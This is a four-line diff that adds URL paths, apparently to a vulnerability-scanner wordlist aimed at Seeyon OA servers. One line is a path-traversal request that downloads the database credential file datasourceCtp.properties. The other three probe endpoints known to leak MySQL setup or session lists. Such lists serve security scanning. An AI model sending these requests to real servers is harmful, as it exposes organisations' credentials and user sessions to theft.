@@ -1,0 +1,4 @@
+/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+/yyoa/createMysql.jsp
+/yyoa/ext/createMysql.jsp
+/yyoa/ext/https/getSessionList.jsp?cmd=getAll
